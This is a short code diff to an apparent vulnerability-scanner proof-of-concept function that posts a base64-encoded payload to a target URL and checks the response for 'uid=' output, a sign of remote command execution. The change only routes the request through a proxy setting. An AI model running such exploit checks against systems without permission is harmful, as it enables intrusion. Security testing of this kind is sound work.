@@ -4,6 +4,7 @@ import base64
 import re
 import requests
 
+from Config.config_proxies import proxies
 from Config.config_requests import headers
 
 requests.packages.urllib3.disable_warnings()
@@ -24,7 +25,7 @@ def poc(target):
     try:
         URL = target + list[0]
         data = base64.b64decode(list[1])
-        res = requests.post(URL, data=data, headers=headers, verify=False)
+        res = requests.post(URL, data=data, headers=headers, verify=False,proxies=proxies)
         response = res.text
         p = re.compile('uid=\d')
         m = p.match(response)
